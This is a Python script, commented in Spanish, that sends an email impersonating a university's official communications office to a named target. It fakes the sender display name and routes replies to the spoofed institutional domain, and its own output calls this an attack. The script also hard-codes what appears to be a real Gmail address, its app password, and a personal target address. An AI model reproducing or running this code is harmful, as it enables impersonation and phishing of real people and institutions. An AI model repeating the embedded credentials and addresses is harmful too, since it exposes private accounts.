#!/usr/bin/env python3
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def send_utn_spoofed_email():
    # =============================================
    # 🔐 CONFIGURACIÓN DE CUENTA REAL
    # =============================================
    # ⚠️ ESTO ES TU CUENTA REAL - NO cambia el remitente real
    gmail_user = "piedrozadaniel@gmail.com"      # ✏️ TU GMAIL REAL
    gmail_password = "xuawyofxhwudgrdn"          # ✏️ TU APP PASSWORD (sin espacios)
    
    # =============================================
    # 🎭 CONFIGURACIÓN DE SUPLANTACIÓN
    # =============================================
    # ✏️ EDITAR ESTO: Lo que VE el receptor
    display_name = "UTN Comunicaciones Oficiales"  # ✏️ NOMBRE que se muestra
    spoofed_email = "comunicaciones@utn.edu.mx"   # ✏️ EMAIL suplantado
    target_email = "ram14xd@outlook.com"          # ✏️ OBJETIVO del ataque
    
    # =============================================
    # 📧 CONTENIDO DEL CORREO FALSIFICADO
    # =============================================
    # ✏️ EDITAR: Hacer el asunto CREÍBLE
    subject = "Actualización del Sistema Académico - UTN"
    
    # ✏️ EDITAR: Cuerpo del mensaje (hacerlo INSTITUCIONAL)
    body = f"""
Estimado miembro de la comunidad UTN,

Le informamos que el Sistema de Gestión Académica será actualizado 
el próximo viernes 29 de noviembre de 2024.

📅 Fecha: 29 de noviembre 2024
⏰ Horario: 08:00 - 14:00 horas  
📋 Actividad: Mantenimiento preventivo del sistema

Durante este período, los siguientes servicios no estarán disponibles:
• Portal del Estudiante
• Sistema de inscripciones
• Consulta de calificaciones
• Plataforma virtual

Para cualquier consulta, responda a: {spoofed_email}

Atentamente,
Dirección de Tecnologías de la Información
Universidad Tecnológica Nacional
www.utn.edu.mx

---
*Este es un mensaje automático, por favor no responda a este correo.*
"""
    
    # =============================================
    # 🔧 CONSTRUCCIÓN DEL EMAIL SPOOFED
    # =============================================
    msg = MIMEMultipart()
    
    # 🎭 ESTA LÍNEA hace la MAGIA del spoofing visual
    msg['From'] = f'"{display_name}" <{gmail_user}>'  # ✏️ Muestra nombre falso
    
    msg['To'] = target_email
    msg['Subject'] = subject
    
    # 🎭 ESTO redirige las respuestas al email suplantado
    msg['Reply-To'] = spoofed_email  # ✏️ Respuestas van al dominio spoofed
    
    msg.attach(MIMEText(body, 'plain'))
    
    # =============================================
    # 🚀 ENVÍO DEL CORREO SPOOFED
    # =============================================
    try:
        print("🎯 INICIANDO ATAQUE DE SPOOFING...")
        print("=" * 50)
        
        print("🚀 Conectando a servidor Gmail...")
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        
        print("🔐 Autenticando con App Password...")
        server.login(gmail_user, gmail_password)
        
        print("📧 Enviando correo spoofed...")
        server.sendmail(gmail_user, target_email, msg.as_string())
        server.quit()
        
        print("✅ ¡ATAQUE EXITOSO!")
        print("=" * 50)
        print(f"🎭 REMITENTE VISUAL: {display_name}")
        print(f"📧 REPLY-TO: {spoofed_email}") 
        print(f"🎯 OBJETIVO: {target_email}")
        print(f"📄 ASUNTO: {subject}")
        print("\n💡 El receptor VERÁ: 'UTN Comunicaciones Oficiales'")
        print("💡 Las respuestas IRÁN a: comunicaciones@utn.edu.mx")
        
    except Exception as e:
        print(f"❌ ERROR: {e}")

if __name__ == "__main__":
    print("🎓 DEMOSTRACIÓN: Email Spoofing - UTN")
    print("🔍 Análisis + Explotación de vulnerabilidad DMARC")
    send_utn_spoofed_email()
